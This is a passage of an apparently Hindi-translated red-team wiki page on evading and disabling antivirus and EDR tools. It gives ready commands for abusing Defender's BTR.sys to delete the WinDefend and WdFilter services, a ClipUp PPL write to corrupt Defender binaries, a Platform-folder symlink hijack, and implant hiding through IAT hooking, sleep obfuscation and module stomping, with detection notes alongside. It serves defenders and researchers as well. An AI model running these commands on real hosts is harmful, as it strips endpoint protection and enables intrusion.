    else:
        f.seek(off)
        f.write(replacement)
```

After मूल फ़ाइलों को बदलने और service stack को रीस्टार्ट करने के बाद:

* **सभी** posture checks हरे/अनुपालनकारी दिखाई देते हैं।
* Unsigned या संशोधित binaries named-pipe RPC endpoints (जैसे, `\\RPC Control\\ZSATrayManager_talk_to_me`) खोल सकते हैं।
* Compromised host को Zscaler policies द्वारा परिभाषित internal network तक अप्रतिबंधित पहुँच मिल जाती है।

यह केस स्टडी दिखाती है कि केवल client-side trust decisions और साधारण signature checks को कुछ byte patches से कैसे हराया जा सकता है।

## Microsoft Defender `BTR.sys` विश्वसनीय-कार्यक्षमता का दुरुपयोग

Defender का **Boot-Time Removal** driver, क्लासिक BYOVD का एक उपयोगी विपरीत उदाहरण है। `BTR.sys` Microsoft द्वारा signed एक वैध remediation component है, जिसमें memory-corruption bug या IOCTL interface नहीं है; administrator access और `SeLoadDriverPrivilege` हासिल करने के बाद, operator इसके बजाय इसके private remediation transaction को forge कर सकता है और इच्छित Ring-0 file/registry operations करवा सकता है। यह **post-compromise AV/EDR-neutralization primitive है, initial access या privilege escalation नहीं**, और driver को किसी ध्यान खींचने वाले third-party driver को import करने के बजाय target के अपने `MpEngine.dll` `BOOTTIMETOOL` resource से निकाला जा सकता है।<sup>[[36]](#references)</sup>

### एक-बार चलने वाले driver को तैयार करना

Defender आमतौर पर इस resource को `[a-z]{8}.sys` नाम वाली random फ़ाइल के रूप में लिखता है और उससे मिलता-जुलता नाम वाला kernel service register करता है। `DriverEntry` service की `Args` value पढ़ता है, संदर्भित NTFS ADS खोलता है, action list को decrypt और validate करता है, feedback लिखता है, और सफल execution के बाद `0xC0000056` (`STATUS_DELETE_PENDING`) लौटाता है, ताकि driver resident रहने के बजाय unload हो जाए। Forged service में निम्नलिखित विशिष्ट values होती हैं।<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream में एक RC4-encrypted blob होता है। विश्लेषित builds में एक fixed 256-byte key का पुनः उपयोग होता है, इसलिए encryption authorization boundary नहीं है। एक मान्य plaintext में 24-byte global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC और payload से निकला transaction ID) होता है, जिसके बाद null-terminated UTF-16 feedback path और कोई भी संख्या में items होते हैं। हर item में 16-byte header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) होता है, जिसके बाद action-specific data होता है और उसका अंत **ठीक चार NUL bytes** से होता है। हर header/data region को CRC-32 polynomial `0xEDB88320`, initial state `0xFFFFFFFF` और **बिना final XOR** (`~CRC32`) का उपयोग करके अलग-अलग जाँचा जाता है; हर region के लिए CRC state reset होती है।<sup>[[36]](#references)[[37]](#references)</sup>

स्वीकृत action IDs इन kernel primitives को उजागर करते हैं।<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | परिणाम |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | किसी file को delete करना, locked file को भी |
| 2 | `[UTF-16 path]` | खाली directory हटाना |
| 3 | `[Flags][source][destination]` | किसी file को attacker द्वारा चुने गए protected path पर ले जाना; खाली destination का अर्थ delete करना है |
| 4 | `[Flags][key path]` | registry key को recursively delete करना |
| 5 | `[Flags][key path + "\\" + value]` | registry value delete करना |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | registry value बनाना/अपडेट करना और अनुपस्थित key paths बनाना |

Actions 5 और 6 के लिए, on-wire key/value separator **लगातार दो backslashes** होते हैं; सामान्य तरीके से format किया गया path सही ढंग से split नहीं होगा। Feedback file अधिकतर request को दर्शाती है, लेकिन हर item के पहले चार data bytes उसका परिणामी `NTSTATUS` बन जाते हैं। Actions 1 और 2 में, जिनमें leading flags field नहीं होती, BTR path को उन चार reserved trailing bytes में खिसका देता है ताकि उस status के लिए जगह बन सके।<sup>[[36]](#references)</sup>

### `BTR_CLI` का workflow और early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) पूरी chain लागू करता है: local Defender से `BTR.sys` निकालना, `<random>.sys:changelist` और एक feedback stream बनाना, chained actions को serialize/checksum/encrypt करना, service registry key सीधे बनाना, फिर `-trigger now` के लिए `NtLoadDriver` call करना या `-trigger boot` के लिए इसे system-start driver के रूप में छोड़ना। सीधे registry staging से सामान्य SCM `CreateServiceW` path से बचा जाता है और इसलिए service-install Event ID 7045 उत्पन्न **नहीं** होता। Boot-triggered artifacts को बाद में `BTR_CLI.exe -cleanup <service_name>` से हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` उपयोगी नहीं है क्योंकि BTR, storage stack और `SystemRoot` link तैयार होने से पहले `DriverEntry` से file I/O करता है। इसके बजाय, `Start=1` और high-priority `Boot Bus Extender` group के साथ यह Phase 1 में चलता है: NTFS उपयोग योग्य होता है, लेकिन कई system-start security drivers और user-mode EDR services अभी initialize नहीं हुए होते। `WdFilter` जैसे boot-start filters पहले से लोड हो चुके हो सकते हैं, फिर भी BTR अगले start से पहले उनकी binaries या service configuration हटा सकता है और SCM द्वारा उन्हें launch किए जाने से पहले service executables delete कर सकता है। ELAM इस कमी को दूर नहीं करता, क्योंकि BTR boot-start evaluation के बाद चलता है और उसके पास मान्य Microsoft signature होता है।<sup>[[36]](#references)</sup>

एक ही transaction में कई actions execute होते हैं। PoC में hard-coded `\SystemRoot\Temp\BootClean.log` के लिए Action 1 पहले जोड़ा जाता है: BTR यह log बनाता है, फिर अपनी ही delete request को पूरा करके unload होने से पहले इसे हटा देता है। इससे evidence कम हो जाता है, जबकि feedback को `<random>.sys:<random>.dat` में रखने पर driver और दोनों streams को एक साथ हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

### उच्च-सिग्नल detection correlations

केवल signature पर आधारित rules और Microsoft vulnerable-driver blocklist, BTR की इच्छित functionality के दुरुपयोग को संबोधित नहीं करते। इन behavioral correlations को प्राथमिकता दें और वैध Defender lineage तथा किसी arbitrary launcher के बीच अंतर करें।<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` का बनना BTR staging में हमेशा होता है। उसी `.sys` से जुड़ा `.dat` ADS विशेष रूप से संदिग्ध है, क्योंकि वैध Defender आमतौर पर feedback को `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` के अंतर्गत रखता है।
- **System 7045 के बिना Sysmon 12/13:** `HKLM\SYSTEM\CurrentControlSet\Services\<random>` की सीधी creation को correlate करें, जिसमें `Args=...:changelist` और `Group=Boot Bus Extender` मौजूद हों, लेकिन उससे मेल खाता SCM installation event न हो।
- **Sysmon 6 -> 23:** ज्ञात BTR driver के non-Defender lineage से load होने के बाद, `System`/PID 4 के नाम से होने वाली file deletion को correlate करें—खासकर security binaries के लिए।
- **Sysmon 11 -> 23:** `System`/PID 4 द्वारा `\SystemRoot\Temp\BootClean.log` को तेज़ी से बनाने और delete करने पर alert करें।
- `SeLoadDriverPrivilege` देने और enable करने को सीमित करें और audit करें; जब `cmd.exe`, PowerShell या कोई अज्ञात process security-tool driver को stage करे, तो केवल Microsoft signature पर्याप्त भरोसे का आधार नहीं है।

## LOLBINs से AV/EDR के साथ छेड़छाड़ करने के लिए Protected Process Light (PPL) का दुरुपयोग

Protected Process Light (PPL) signer/level hierarchy लागू करता है, ताकि केवल समान या उच्चतर protected processes ही एक-दूसरे के साथ छेड़छाड़ कर सकें। Offensive दृष्टिकोण से, यदि आप वैध रूप से PPL-enabled binary launch कर सकते हैं और उसके arguments नियंत्रित कर सकते हैं, तो आप benign functionality (जैसे logging) को AV/EDR द्वारा उपयोग की जाने वाली protected directories के विरुद्ध सीमित, PPL-backed write primitive में बदल सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

किसी process को PPL के रूप में चलाने के लिए
- Target EXE (और लोड की गई कोई भी DLL) पर PPL-capable EKU के साथ हस्ताक्षर होना चाहिए।
- Process को इन flags के साथ CreateProcess का उपयोग करके बनाया जाना चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`।
- ऐसा compatible protection level माँगा जाना चाहिए जो binary के signer से मेल खाता हो (जैसे, anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`)। गलत levels पर process creation विफल होगा।

PP/PPL और LSASS protection के व्यापक परिचय के लिए यह भी देखें:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level चुनता है और arguments को target EXE तक पहुँचाता है):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- उपयोग का तरीका:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- हस्ताक्षरित सिस्टम बाइनरी `C:\Windows\System32\ClipUp.exe` खुद को लॉन्च करती है और कॉलर द्वारा निर्दिष्ट पाथ पर लॉग फ़ाइल लिखने के लिए पैरामीटर स्वीकार करती है।
- PPL process के रूप में लॉन्च किए जाने पर, फ़ाइल लिखने की कार्रवाई PPL backing के साथ होती है।
- ClipUp spaces वाले पाथ पार्स नहीं कर सकता; सामान्यतः सुरक्षित स्थानों तक पहुँचने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- Short names की सूची देखें: हर parent directory में `dir /x` चलाएँ।
- cmd में short path निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launcher (जैसे CreateProcessAsPPL) का उपयोग करके `CREATE_PROTECTED_PROCESS` के साथ PPL-सक्षम LOLBIN (ClipUp) लॉन्च करें।
2) सुरक्षित AV directory (जैसे Defender Platform) में फ़ाइल बनवाने के लिए ClipUp का log-path argument दें। ज़रूरत पड़ने पर 8.3 short names का उपयोग करें।
3) यदि AV चलते समय target binary सामान्यतः खुली/locked रहती है (जैसे MsMpEng.exe), तो AV शुरू होने से पहले boot पर write शेड्यूल करें। ऐसा auto-start service इंस्टॉल करें जो भरोसेमंद ढंग से पहले चले। Process Monitor (boot logging) से boot ordering की पुष्टि करें।
4) Reboot पर PPL-backed write, AV द्वारा अपनी binaries को lock करने से पहले होती है, जिससे target file corrupt हो जाती है और AV startup रुक जाता है।

Example invocation (सुरक्षा के लिए पाथ छिपाए/छोटे किए गए):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

नोट्स और सीमाएँ
- आप ClipUp द्वारा लिखे जाने वाले कंटेंट को नियंत्रित नहीं कर सकते, केवल उसकी जगह को नियंत्रित कर सकते हैं; यह primitive सटीक कंटेंट इंजेक्शन के बजाय corruption के लिए उपयुक्त है।
- Service इंस्टॉल/स्टार्ट करने और reboot window के लिए local admin/SYSTEM आवश्यक है।
- Timing महत्वपूर्ण है: target खुला नहीं होना चाहिए; boot-time execution से file locks से बचा जा सकता है।

पता लगाने के तरीके
- Boot के आसपास असामान्य arguments के साथ `ClipUp.exe` का process creation, विशेष रूप से जब उसका parent कोई non-standard launcher हो।
- ऐसे नए services जो संदिग्ध binaries को auto-start के लिए configure किए गए हों और लगातार Defender/AV से पहले शुरू होते हों। Defender के startup failures से पहले service creation/modification की जाँच करें।
- Defender binaries/Platform directories की file integrity monitoring; protected-process flags वाले processes द्वारा अप्रत्याशित file creations/modifications।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा PPL level के असामान्य उपयोग पर नज़र रखें।

Mitigations
- WDAC/Code Integrity: सीमित करें कि कौन-से signed binaries PPL के रूप में और किन parents के अंतर्गत चल सकते हैं; वैध contexts के बाहर ClipUp invocation को block करें।
- Service hygiene: auto-start services बनाने/संशोधित करने पर रोक लगाएँ और start-order manipulation की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections enabled हों; binary corruption के संकेत देने वाली startup errors की जाँच करें।
- यदि आपके environment के साथ संगत हो, तो security tooling वाले volumes पर 8.3 short-name generation अक्षम करने पर विचार करें (अच्छी तरह test करें)।

## Platform Version Folder Symlink Hijack के ज़रिए Microsoft Defender से छेड़छाड़

Windows Defender उस platform का चयन करता है जहाँ से वह निम्नलिखित के अंतर्गत मौजूद subfolders की सूची बनाकर चलता है:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह सबसे ऊँची lexicographic version string वाला subfolder चुनता है (उदाहरण के लिए, `4.18.25070.5-0`), फिर वहीं से Defender service processes शुरू करता है (और service/registry paths को तदनुसार अपडेट करता है)। यह चयन directory entries पर भरोसा करता है, जिनमें directory reparse points (symlinks) भी शामिल हैं। Administrator इसका फ़ायदा उठाकर Defender को attacker-writable path पर redirect कर सकता है और DLL sideloading या service disruption कर सकता है।<sup>[[21]](#references)[[22]](#references)</sup>

पूर्वापेक्षाएँ
- Local Administrator (Platform folder के अंतर्गत directories/symlinks बनाने के लिए आवश्यक)
- Reboot करने या Defender platform re-selection शुरू करने की क्षमता (boot पर service restart)
- केवल built-in tools की आवश्यकता (mklink)

यह क्यों काम करता है
- Defender अपने folders में writes को block करता है, लेकिन उसका platform selection directory entries पर भरोसा करता है और यह सत्यापित किए बिना कि target किसी protected/trusted path पर resolve होता है या नहीं, lexicographically सबसे ऊँचा version चुनता है।

चरण-दर-चरण (उदाहरण)
1) मौजूदा platform folder की writable clone तैयार करें, जैसे `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform के अंदर अपने folder की ओर इंगित करने वाला higher-version directory symlink बनाएँ:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) ट्रिगर चयन (रीबूट की अनुशंसा):
```cmd
shutdown /r /t 0
```
4) सत्यापित करें कि MsMpEng.exe (WinDefend) redirected path से चलता है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के अंतर्गत नया process path और उस location को दर्शाने वाला service configuration/registry दिखना चाहिए।

Post-exploitation विकल्प
- DLL sideloading/code execution: Defender द्वारा अपनी application directory से लोड की जाने वाली DLLs को drop/replace करें, ताकि Defender की processes में code execute हो। ऊपर दिया गया section देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying)।
- Service kill/denial: version-symlink हटाएँ, ताकि अगली बार start होने पर configured path resolve न हो और Defender start होने में विफल हो जाए:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> ध्यान दें कि यह technique अपने आप privilege escalation प्रदान नहीं करती; इसके लिए admin rights आवश्यक हैं।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से हटाकर सीधे target module में ले जा सकती हैं। इसके लिए वे उसके Import Address Table (IAT) को hook करती हैं और चुनी हुई APIs को attacker-controlled, position-independent code (PIC) के ज़रिए route करती हैं। इससे evasion उन छोटी API surfaces से आगे बढ़ती है जिन्हें कई kits expose करती हैं (जैसे, CreateProcessA), और यही protections BOFs तथा post-exploitation DLLs तक भी लागू होती हैं।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

उच्च-स्तरीय तरीका
- Reflective loader (prepended या companion) का उपयोग करके target module के साथ PIC blob stage करें। PIC self-contained और position-independent होना चाहिए।
- Host DLL के load होते समय, उसके IMAGE_IMPORT_DESCRIPTOR को traverse करें और targeted imports (जैसे, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) के IAT entries को thin PIC wrappers पर point करने के लिए patch करें।
- हर PIC wrapper, real API address को tail-call करने से पहले evasions चलाता है। सामान्य evasions में शामिल हैं:
  - Call के दौरान memory mask/unmask करना (जैसे, beacon regions को encrypt करना, RWX→RX करना, page names/permissions बदलना), फिर call के बाद उन्हें restore करना।
  - Call-stack spoofing: एक benign stack बनाना और target API में transition करना, ताकि call-stack analysis में अपेक्षित frames resolve हों।<sup>[[9]](#references)</sup>
- Compatibility के लिए ऐसा interface export करें जिससे Aggressor script (या equivalent) Beacon, BOFs और post-ex DLLs के लिए hook की जाने वाली APIs register कर सके।

यहाँ IAT hooking क्यों
- Hook किए गए import का उपयोग करने वाले किसी भी code के लिए काम करता है; tool code को modify करने या specific APIs को proxy करने के लिए Beacon पर निर्भर रहने की ज़रूरत नहीं होती।
- Post-ex DLLs को cover करता है: LoadLibrary* को hook करने से आप module loads (जैसे, System.Management.Automation.dll, clr.dll) को intercept कर सकते हैं और उनकी API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके call-stack–based detections के विरुद्ध process-spawning post-ex commands का विश्वसनीय उपयोग फिर से संभव बनाता है।

न्यूनतम IAT hook रूपरेखा (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Relocations/ASLR के बाद और import के पहली बार उपयोग से पहले patch लागू करें। TitanLdr/AceLdr जैसे Reflective loaders, लोड किए गए module के DllMain के दौरान hooking करने के उदाहरण हैं।
- Wrappers छोटे और PIC-safe रखें; patch करने से पहले कैप्चर किए गए original IAT value या LdrGetProcedureAddress के ज़रिए असली API resolve करें।
- PIC के लिए RW → RX transitions का उपयोग करें और pages को writable+executable न छोड़ें।

Call-stack spoofing stub
- Draugr-style PIC stubs एक fake call chain (benign modules के return addresses) बनाते हैं और फिर असली API पर pivot करते हैं।
- इससे वे detections विफल हो जाते हैं जो संवेदनशील APIs को कॉल करने वाले Beacon/BOFs से canonical stacks की अपेक्षा करते हैं।
- API prologue से पहले expected frames के अंदर पहुँचने के लिए stack cutting/stack stitching techniques के साथ इसका उपयोग करें।

Operational integration
- Reflective loader को post-ex DLLs से पहले रखें, ताकि DLL लोड होने पर PIC और hooks अपने-आप initialize हों।
- Target APIs register करने के लिए Aggressor script का उपयोग करें, ताकि Beacon और BOFs को code में बदलाव किए बिना वही evasion path transparently मिले।

Detection/DFIR considerations
- IAT integrity: ऐसे entries जो non-image (heap/anon) addresses पर resolve हों; import pointers की समय-समय पर verification।
- Stack anomalies: ऐसे return addresses जो loaded images का हिस्सा न हों; non-image PIC पर अचानक transitions; असंगत RtlUserThreadStart ancestry।
- Loader telemetry: IAT पर in-process writes, import thunks को बदलने वाली शुरुआती DllMain activity, load के समय बने अप्रत्याशित RX regions।
- Image-load evasion: यदि LoadLibrary* को hook किया गया हो, तो memory masking events के साथ संबंधित automation/clr assemblies के संदिग्ध loads पर नज़र रखें।

Related building blocks and examples
- ऐसे Reflective loaders जो load के दौरान IAT patching करते हैं (जैसे, TitanLdr, AceLdr)
- Memory masking hooks (जैसे, simplehook) और stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (जैसे, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

यदि आपका नियंत्रण किसी reflective loader पर है, तो `ProcessImports()` के **दौरान** loader के `GetProcAddress` pointer को ऐसे custom resolver से बदलकर imports hook कर सकते हैं, जो पहले hooks जाँचता है:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- एक **resident PICO** (persistent PIC object) बनाएँ, जो transient loader PIC के खुद को free करने के बाद भी बना रहे।
- एक `setup_hooks()` function export करें, जो loader के import resolver को overwrite करे (जैसे, `funcs.GetProcAddress = _GetProcAddress`)।
- `_GetProcAddress` में ordinal imports को छोड़ें और `__resolve_hook(ror13hash(name))` जैसा hash-based hook lookup उपयोग करें। Hook मौजूद हो, तो उसे return करें; अन्यथा असली `GetProcAddress` को call करें।
- Crystal Palace में link time पर `addhook "MODULE$Func" "hook"` entries के ज़रिए hook targets register करें। Hook मान्य रहता है, क्योंकि वह resident PICO के अंदर रहता है।

इससे load के बाद loaded DLL के code section को patch किए बिना **import-time IAT redirection** मिलती है।

### जब target PEB-walking का उपयोग करता हो, तब hookable imports को बाध्य करना

Import-time hooks तभी trigger होते हैं, जब function वास्तव में target के IAT में हो। यदि कोई module PEB-walk + hash के ज़रिए APIs resolve करता है (और import entry नहीं होती), तो वास्तविक import जोड़ें, ताकि loader का `ProcessImports()` path उसे देख सके:

- Hashed export resolution (जैसे, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) को `&WaitForSingleObject` जैसे direct reference से बदलें।
- Compiler एक IAT entry emit करेगा, जिससे reflective loader के imports resolve करने पर interception संभव होगा।

### `Sleep()` को patch किए बिना Ekko-style sleep/idle obfuscation

`Sleep` को patch करने के बजाय, implant द्वारा उपयोग किए जाने वाले **वास्तविक wait/IPC primitives** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) को hook करें। लंबे waits के लिए, idle के दौरान in-memory image को encrypt करने वाली Ekko-style obfuscation chain में call को wrap करें:<sup>[[31]](#references)[[27]](#references)</sup>

- Callbacks का एक sequence schedule करने के लिए `CreateTimerQueueTimer` का उपयोग करें, जो crafted `CONTEXT` frames के साथ `NtContinue` call करें।
- सामान्य chain (x64): image को `PAGE_READWRITE` पर सेट करें → पूरी mapped image पर `advapi32!SystemFunction032` के ज़रिए RC4 encrypt करें → blocking wait करें → RC4 decrypt करें → PE sections को traverse करके **प्रति-section permissions restore** करें → completion signal करें।
- `RtlCaptureContext` एक template `CONTEXT` देता है; इसे कई frames में clone करें और हर step invoke करने के लिए registers (`Rip/Rcx/Rdx/R8/R9`) सेट करें।

Operational detail: लंबे waits के लिए “success” (जैसे, `WAIT_OBJECT_0`) return करें, ताकि image masked रहते समय caller आगे बढ़ सके। यह तरीका idle windows के दौरान module को scanners से छिपाता है और “patched `Sleep()`” के आम signature से बचता है।

Detection ideas (telemetry-based)
- `NtContinue` की ओर point करने वाले `CreateTimerQueueTimer` callbacks के bursts।
- बड़े, contiguous, image-sized buffers पर `advapi32!SystemFunction032` का उपयोग।
- बड़े-range `VirtualProtect` के बाद custom per-section permission restoration।

### Sleep-obfuscation gadgets के लिए runtime CFG registration

CFG-enabled targets पर, `jmp [rbx]` या `jmp rdi` जैसे mid-function gadget में पहला indirect jump आम तौर पर `STATUS_STACK_BUFFER_OVERRUN` के साथ process को crash कर देगा, क्योंकि gadget module के CFG metadata में मौजूद नहीं है। Hardened processes के अंदर Ekko/Kraken-style chains को चालू रखने के लिए:<sup>[[30]](#references)</sup>

- Chain द्वारा उपयोग किए जाने वाले हर indirect destination को `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` और `CFG_CALL_TARGET_VALID` entries के साथ register करें।
- Loaded images (`ntdll`, `kernel32`, `advapi32`) के अंदर मौजूद addresses के लिए `MEMORY_RANGE_ENTRY` को **image base** से शुरू होकर **पूरे image size** को cover करना चाहिए।
- Manually mapped/PIC/stomped regions के लिए, इसके बजाय **allocation base** और allocation size का उपयोग करें।
- केवल dispatch gadget ही नहीं, बल्कि indirectly पहुँचने वाले exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) और उन attacker-controlled executable sections को भी mark करें, जो indirect targets बनेंगे।

इससे ROP/JOP-style sleep chains, “केवल non-CFG processes में काम करता है” से बदलकर `explorer.exe`, browsers, `svchost.exe` और `/guard:cf` के साथ compiled अन्य endpoints में reusable primitive बन जाती हैं।

### Sleeping threads के लिए CET-safe stack spoofing

पूरा `CONTEXT` बदलना noisy है और CET Shadow Stack systems पर विफल हो सकता है, क्योंकि spoofed `Rip` का hardware shadow stack से मेल खाना ज़रूरी है। Sleep masking का एक सुरक्षित तरीका है:<sup>[[30]](#references)</sup>

- उसी process का कोई दूसरा thread चुनें और `NtQueryInformationThread` के ज़रिए उसके `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) पढ़ें।
- Current thread का असली TEB/TIB backup करें।
- `GetThreadContext` से sleeping context कैप्चर करें।
- Spoof context में **केवल** असली `Rip` copy करें; spoofed `Rsp`/stack state को वैसा ही रहने दें।
- Sleep window के दौरान, spoof thread का `NT_TIB` current TEB में copy करें, ताकि stack walkers एक legitimate stack range के अंदर unwind करें।
- Wait पूरा होने के बाद, original TIB और thread context restore करें।

इससे CET-consistent instruction pointer बना रहता है, जबकि उन EDR stack walkers को गुमराह किया जाता है जो unwinds को validate करने के लिए TEB stack metadata पर भरोसा करते हैं।

### APC-based alternative: Kraken Mask

यदि timer-queue dispatch का signature बहुत आसानी से पहचाना जाता हो, तो यही sleep-encrypt-spoof-restore sequence queued APCs के ज़रिए suspended helper thread से चलाया जा सकता है:<sup>[[27]](#references)</sup>

- Entry point के रूप में `NtTestAlert` वाला helper thread बनाएँ।
- `NtQueueApcThread` से तैयार `CONTEXT` frames/APCs queue करें और `NtAlertResumeThread` से उन्हें drain करें।
- Default 64 KB thread stack खत्म होने से बचाने के लिए chain state को helper stack के बजाय heap पर रखें।
- Start event को atomically signal करने और block करने के लिए `NtSignalAndWaitForSingleObject` का उपयोग करें।
- TIB/context restore करने से पहले main thread suspend करें (`NtSuspendThread` → restore → `NtResumeThread`), ताकि scanner द्वारा आधी-restored stack पकड़े जाने की race window कम हो।

इससे वही RC4 masking और stack-spoofing लक्ष्य रखते हुए `CreateTimerQueueTimer` + `NtContinue` signature की जगह helper-thread/APC signature इस्तेमाल होता है।

Additional detection ideas
- Sleeps, waits या APC dispatch से ठीक पहले `NtSetInformationVirtualMemory` का `VmCfgCallTargetInformation` के साथ उपयोग।
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` या `ConnectNamedPipe` के आसपास `GetThreadContext`/`SetThreadContext` का उपयोग।
- `NtQueryInformationThread` के बाद current thread के TEB/TIB stack bounds में direct writes।
- `NtQueueApcThread`/`NtAlertResumeThread` chains जो अप्रत्यक्ष रूप से `SystemFunction032`, `VirtualProtect` या section-permission restoration helpers तक पहुँचती हैं।
- Signed modules के अंदर dispatch pivots के रूप में `FF 23` (`jmp [rbx]`) या `FF E7` (`jmp rdi`) जैसे छोटे gadget signatures का बार-बार उपयोग।


## Precision Module Stomping

Module stomping, स्पष्ट private executable memory allocate करने या नई sacrificial DLL load करने के बजाय, payloads को **target process में पहले से mapped DLL के `.text` section से** execute करता है। Overwrite target एक **loaded, disk-backed image** होना चाहिए, जिसका code space payload को इस तरह समायोजित कर सके कि process को अब भी ज़रूरी code paths corrupt न हों।<sup>[[1]](#references)[[2]](#references)</sup>

### विश्वसनीय target चुनना

`uxtheme.dll` या `comctl32.dll` जैसे आम modules पर naive stomping नाज़ुक होता है: DLL remote process में loaded न हो सकती है और code region बहुत छोटा होने पर process crash हो सकता है। अधिक विश्वसनीय workflow:

1. Target process के modules enumerate करें और पहले से loaded DLLs की **केवल names वाली include list** रखें।
2. पहले payload बनाएँ और उसका **सटीक byte size** दर्ज करें।
3. Disk पर candidate DLLs scan करें और PE section **`.text` `Misc_VirtualSize`** की तुलना payload size से करें। यह file size से अधिक मायने रखता है, क्योंकि यह executable section का **memory में map होने पर** आकार दर्शाता है।
4. **Export Address Table (EAT)** parse करें और stomp के शुरुआती offset के रूप में किसी exported function RVA को चुनें।
5. **Blast radius** की गणना करें: यदि payload चुने गए function boundary से बड़ा है, तो यह memory में उसके बाद रखे adjacent exports को overwrite करेगा।

आम तौर पर इस्तेमाल होने वाले recon/selection helpers:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

ऑपरेशनल नोट्स
- `LoadLibrary`/unexpected image loads की telemetry से बचने के लिए remote process में **पहले से loaded** DLLs को प्राथमिकता दें।
- ऐसे exports को प्राथमिकता दें जिन्हें target application शायद ही कभी execute करती हो; अन्यथा सामान्य code paths, thread creation से पहले या बाद में stomped bytes तक पहुँच सकते हैं।
- बड़े implants के लिए अक्सर shellcode embedding को string literal से **byte-array/braced initializer** में बदलना पड़ता है, ताकि injector source में पूरा buffer सही ढंग से दर्शाया जा सके।

डिटेक्शन के सुझाव
- अधिक आम private RWX/RX allocations के बजाय **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) में remote writes।
- ऐसे export entry points जिनके in-memory bytes अब disk पर मौजूद backing file से मेल नहीं खाते।
